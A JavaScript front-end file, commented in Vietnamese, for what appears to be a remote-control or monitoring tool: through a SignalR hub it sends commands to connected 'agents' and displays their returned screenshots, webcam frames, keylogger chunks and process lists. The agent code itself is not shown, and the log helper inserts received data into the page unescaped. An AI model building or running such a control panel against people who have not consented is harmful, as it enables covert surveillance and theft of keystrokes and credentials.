﻿// 1. Cấu hình kết nối
// Lưu ý: Dùng đường dẫn tương đối "/controlhub" để tự nhận host hiện tại
const connection = new signalR.HubConnectionBuilder()
    .withUrl("/controlhub")
    .withAutomaticReconnect()
    .build();

const imgElement = document.getElementById("screenImg");
const logList = document.getElementById("logList");

// 2. Hàm bắt đầu kết nối
async function start() {
    try {
        await connection.start();
        console.log(">>> Đã kết nối tới Server Backend!");
        addLog("System", "Đã kết nối thành công tới Server.");
    } catch (err) {
        console.error("Lỗi kết nối: " + err);
        setTimeout(start, 3000); // Thử lại sau 3s
    }
}

// 3. Xử lý sự kiện khi bấm nút
document.querySelectorAll('.comic-button').forEach(button => {
    button.addEventListener('click', async () => {
        const cmdType = button.getAttribute('data-command');
        const payload = button.getAttribute('data-payload') || ""; // Lấy payload nếu có (ví dụ webcam)

        addLog("Sent", `Gửi lệnh: ${cmdType} ${payload}`);

        // Hiệu ứng nút bấm (Optional)
        button.style.transform = "scale(0.95)";
        setTimeout(() => button.style.transform = "scale(1)", 100);

        try {
            // Gọi hàm 'SendCommandToAgent' bên Backend (File ControlHub.cs)
            await connection.invoke("SendCommandToAgent", cmdType, payload);
        } catch (err) {
            console.error(err);
            addLog("Error", "Không gửi được lệnh.");
        }
    });
});

// 4. Lắng nghe dữ liệu từ Server trả về (Agent gửi lên)
connection.on("UpdateUI", (response) => {
    // response cấu trúc: { agentId, dataType, data }

    if (response.dataType === "SCREENSHOT" || response.dataType === "WEBCAM_FRAME") {
        // Hiển thị ảnh
        imgElement.style.display = "block";
        imgElement.src = "data:image/jpeg;base64," + response.data;
        addLog("Received", `Nhận ảnh từ ${response.dataType}`);
    }
    else if (response.dataType === "KEYLOG_CHUNK") {
        addLog("Keylog", response.data);
    }
    else if (response.dataType === "APP_LIST" || response.dataType === "PROCESS_LIST") {
        // response.data là List<string>
        logList.innerHTML = ""; // Xóa cũ
        response.data.forEach(item => {
            addLog("Process", item);
        });
    }
});

// Hàm phụ trợ để ghi log ra màn hình
function addLog(type, message) {
    const li = document.createElement("li");
    li.style.borderBottom = "1px solid #eee";
    li.style.padding = "5px";
    li.innerHTML = `<strong>[${type}]</strong>: ${message}`;
    logList.prepend(li); // Thêm vào đầu danh sách
}

// Bắt đầu chạy
start();